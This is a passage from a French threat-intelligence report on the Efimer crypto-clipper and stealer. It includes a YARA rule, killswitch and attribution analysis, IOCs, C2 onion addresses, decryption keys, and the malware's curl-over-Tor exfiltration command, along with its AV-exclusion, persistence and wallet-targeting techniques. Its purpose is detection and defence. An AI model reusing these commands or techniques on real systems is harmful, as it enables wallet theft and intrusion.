        $pyi_version   = "PyInstaller-5.13.2" ascii
        $pyi_dll       = "python313.dll" ascii
        $pyi_pyz       = "PYZ-00.pyz" ascii
        $pyarmor_magic = { 50 59 30 30 30 30 30 30 }  // b'PY000000'
        $xor_key       = "Is8xqLVw7pTB" ascii
        $recent_path   = "Microsoft\\Windows\\Recent" wide ascii
        $install_path  = "C:\\Users\\Public\\Videos\\" wide ascii
        $ipinfo        = "ipinfo.io/country" ascii
        $nonce         = "i.non-profit" ascii

    condition:
        uint16(0) == 0x5A4D
        and filesize > 12MB and filesize < 18MB
        and $pyi_dll
        and ($pyi_version or $pyi_pyz)
        and $xor_key
        and ($recent_path or $install_path)
        and ($pyarmor_magic or $ipinfo)
}
```

Les indicateurs les plus stables pour une règle minimaliste : `$xor_key` (`Is8xqLVw7pTB`) et `$pyi_dll` (`python313.dll`), ensemble ils distinguent Efimer de tout autre bundle PyInstaller connu avec une quasi-absence de faux positifs.

### 12.3 Killswitch : analyse et limites

`_selfDestruct()` dans `002_n.js` : suppression de la tâche planifiée, du répertoire, arrêt de `uusd.exe`, sortie. Déclenché par la commande `U!` reçue du C2 en réponse à un ping de `route.php`. Fonctionnellement complet et propre.

**Ce qui rend un déclenchement externe impossible** : les adresses `.onion` v3 encodent directement la clé publique ed25519 du serveur. Il n'y a pas de registrar, pas de NX-domain possible, pas de redélégation. L'unique chemin vers ces serveurs passe par la clé privée correspondante, que personne d'autre que l'opérateur ne détient.

---

## 13. Attribution

### 13.1 Profil de l'acteur

| Dimension | Indicateur | Confiance |
|-----------|-----------|-----------|
| Matériel | PC physique Arrow Lake (`DESKTOP-UOB4Aig`), 8 cœurs, pas de VM | Élevée |
| Système | Windows 10/11, Python 3.13, LLVM, VS Code, Node.js, WireGuard | Élevée |
| Ancienneté | Wallet BTC actif depuis mars 2025 (16 mois confirmés) | Élevée |
| Infrastructure | Activateur TRON actif depuis octobre 2023 (33 mois) | Élevée |
| Revenus visibles | ~290 EUR BTC + ~375 USD USDT sur les adresses hardcodées | Élevée |
| Revenus réels | Non estimables (40 000 adresses, 0 TX visible sur l'échantillon) | Faible |
| Exchanges KYC | Comptes sur au moins deux plateformes soumises au KYC | Élevée |
| Paiement tiers | 330 USDT reçus de `TTgSknazmXS4`, probable acheteur d'accès (MaaS) | Moyenne |
| Fuseau horaire | UTC-5 plausible (voir §13.2), non définitif | Faible |
| Nationalité | Non déterminable | N/A |
| Mode opératoire | Développement actif, upgrade bootloader en parallèle (5.13.2 vers 6.20.0) | Élevée |

### 13.2 Triangulation temporelle (non concluante)

Deux timestamps de compilation indépendants :

`psutil` (bibliothèque Python recompilée par l'attaquant lui-même, la version officielle pour Python 3.13/win64 n'existait pas encore) : PE timestamp `2026-01-22 02:52 UTC`. En hypothèse d'une session de travail en soirée, cela pointe vers UTC-5 (21:52 EST) ou UTC-6 (20:52 CST). Plausible si l'acteur est côte est ou centre des États-Unis.

Bootloader `campus.py` : mtime `2026-05-30 17:43 UTC`. Compatible avec UTC-5 (12:43), UTC+1 (18:43), UTC+2 (19:43) et UTC+3 (20:43). Pas discriminant seul.

Les deux timestamps ne convergent pas vers un seul fuseau. UTC-5 est le seul compatible avec les deux si on accepte que 02:52 UTC peut être une session nocturne. **Conclusion : fuseau non définitif.** Une troisième donnée indépendante serait nécessaire pour trancher.

---

## 14. Limites et honnêteté méthodologique

- **Exchanges KYC non nommés.** `bc1qm34` et `bc1qx9n80` ont été prouvés comme exchanges par leur profil de transactions (volume, clusters d'adresses, pattern de retrait 1-vers-N), mais leur nom n'a pas pu être confirmé sans accès à Arkham Intelligence, OKLink ou Bitquery. Les tentatives sur 15+ services sans inscription ont toutes échoué.

- **xpub non déterminable.** Les 40 000 adresses de `002a.txt` pourraient provenir d'un seul xpub (dérivation BIP84) ou être générées indépendamment. Les 200 adresses `bc1q` échantillonnées ont zéro transaction : les clés publiques ne sont pas sur la chaîne, et l'xpub n'a pas été trouvé dans les artefacts binaires. La distribution d'entropie des suffixes (13,277 bits, max théorique 13,280) est compatible avec les deux hypothèses.

- **Config WireGuard inaccessible.** WireGuard est présent dans le PATH de la machine de build (confirmé depuis le lock-waf). Les fichiers de configuration VPN sont stockés sur la machine de l'attaquant, pas dans les artefacts bundlés. Le serveur VPN utilisé pour se connecter à l'infrastructure C2 n'a pas pu être identifié.

- **Payload final `002_b.js` jamais activé.** Le bruteforcer n'est livré que sur commande C2, pas déposé lors de l'installation initiale. Son comportement de brute force n'a été confirmé que statiquement, jamais observé en exécution.

- **Le vrai canal de distribution (page ClickFix) n'a pas été analysé.** L'analyse porte uniquement sur le binaire, pas sur la page web de leurre ni sur la commande PowerShell initiale qui déclenche le téléchargement.

- **Fonctionnalité USB planifiée, non implémentée.** Les identifiants `checkNewDrives`, `ControlDrive`, `RefreshDrive` et les lettres de lecteur `D: E: F: G: X: Y: Z:` sont présents dans la configuration de l'obfuscateur de l'installeur, mais aucun des scripts JS actuels ne les définit. La propagation USB est une fonctionnalité annoncée, pas encore déployée.

---

## 15. IOCs consolidés

### Hashes

| SHA256 | Composant |
|--------|-----------|
| `a9b557921c40fd625b775e66d6fd99807058133057e94ee7483990f10817fdb4` | Dropper complet (sample analysé) |

Imphash `dcaf48c1f10b0efa0a4472200f3850ed` commun à 100+ builds de la campagne.

### Clés de chiffrement

| Clé | Rôle |
|-----|------|
| `ab738f35ffce23b13ae73d5a2c17a896` | Clé AES-CBC PyArmor 8.x |
| `i.non-profit` | Nonce PyArmor (licence non-commerciale) |
| `Is8xqLVw7pTB` | Clé XOR 12 octets, tous les payloads |

### Adresses crypto de l'attaquant

| Format | Adresse |
|--------|---------|
| BTC P2PKH | `12FfZsjyDri1ir3EUU85pRE5quUEPY5Qf4` |
| BTC P2SH | `32ozR62LxL6ynHYBHZhCz5faRjhYrmNheW` |
| BTC Bech32 | `bc1qz33n9xuqkxl7wxy8j0n4haapr73w64umdj7tw0` |
| TRX | `TAwHPzmZC7rvCKiLmRnr458xZH1D8M5c82` |
| XMR | `87Y35DbRFf2G2PyghoVAox4tsxfxqwjZh3AMaxrkjasBNW4rmQWs9hfanP5haACxfnXrKPZoesSP18XciY8xVaoY5MLitaW` |

### Réseau

| Type | Valeur |
|------|--------|
| Clipper exfil/commandes | `hek5ensy7wqqls2cafflihs7sdqr4dwxux47vp3k7pgffeasxsfeeyid.onion/route.php` |
| Clipper mises à jour | `swjxev2rvxfivi2wvkxre5vaxkjeepxzxva4u4ydm2qbkbakh6wnyead.onion/core/repla.php` |
| Bruteforcer WP | `gfoqsewps57xcyxoedle2gd53o6jne6y5nq5eh25muksqwzutzq7b3ad.onion/route.php` |
| Proxy Tor local | `127.0.0.1:9050` (SOCKS5, lancé par `uusd.exe`) |
| Geo-check | `https://ipinfo.io/country` |

### Identités cryptographiques C2 (ed25519)

| Serveur | Clé publique |
|---------|-------------|
| Clipper exfil | `3915d23658fda105cb42014ab41e5f90e11e0ed7a5f9fabf6afbcc529012bc8a` |
| Clipper update | `9593725751adca8aa356aaaf1276a0ba92423ef9bd41ca730366a015040a3fac` |
| Bruteforcer | `315d0912cf977f7162ee20d64d187ddbbc9693d8eb61d21f5d6515285b349e61` |

### Comportement et persistance

| Comportement | Détail |
|---|---|
| Anti-sandbox | `%APPDATA%\Microsoft\Windows\Recent` : moins de 32 fichiers = abort |
| AV bypass | `Add-MpPreference` sur chemins d'installation + `cmd.exe` + `clip.exe` |
| Persistance | Tâche planifiée toutes les 60 secondes + clé `HKCU\...\Run` |
| Dossier d'installation | `C:\Users\Public\Videos\[slug journalier]\` (attribut HIDDEN) |
| Nommage | 8 caractères CVCVCVCV, SHA256-déterministe par date UTC, précomputable |
| Exfil C2 | `curl --socks5-hostname localhost:9050 <onion>` (résolution DNS côté Tor) |
| Seed BIP39 | Accumulation inter-événements, seuil 12 mots |
| Remplacement adresse | Correspondance de suffixes (2-4 derniers chars), visuellement indétectable |
| Desktop wallets | Atomic, Electrum, Exodus, Bitcoin Core, Ledger, Trezor, Monero GUI, Binance, SafePal, KeepKey, Armory |
| Browser wallets | 65+ extensions (MetaMask, Phantom, Coinbase, Trust Wallet, Keplr...) |

### Machine de build (fuite OPSEC)

| Champ | Valeur |
|-------|--------|
| Hostname | `DESKTOP-UOB4Aig` |
| CPU | Intel Arrow Lake, Family 6 Model 198, 8 cœurs physiques |
| OS | Windows 10/11 |
| Chemin de build | `C:\Users\User\Desktop\pyinstaller-6.20.0\` |
| Date de build | 2026-05-30 04:49 UTC |

---

## 16. Reproduire l'analyse

La séquence complète (commandes exactes, sorties brutes, justification de chaque étape) est dans [`runbook.md`](runbook.md), qui couvre :

- Extraction PyInstaller et identification du bundle
- Contournement PyArmor : localisation de la clé AES dans `pyarmor_runtime.pyd`
- Décompilation `installer.pyc` et reconstruction de `daily_random_slug()`
- Déchiffrement XOR des sept payloads
- Désobfuscation de `002_n.js` (simulation IIFE Python, gestion `parseInt`/`int`)
- Restauration de l'archive RAR5 (handler cp1252 personnalisé)
- Requêtes OSINT blockchain (mempool.space, Tronscan, MalwareBazaar)

Prérequis minimaux : Python 3.13, `pyinstxtractor`, `Pyarmor-Static-Unpack-1shot` v0.4.0, `pycdc`, `pefile`. Installation détaillée dans [`runbook.md`](runbook.md), section "Reproductibilité de bout en bout".
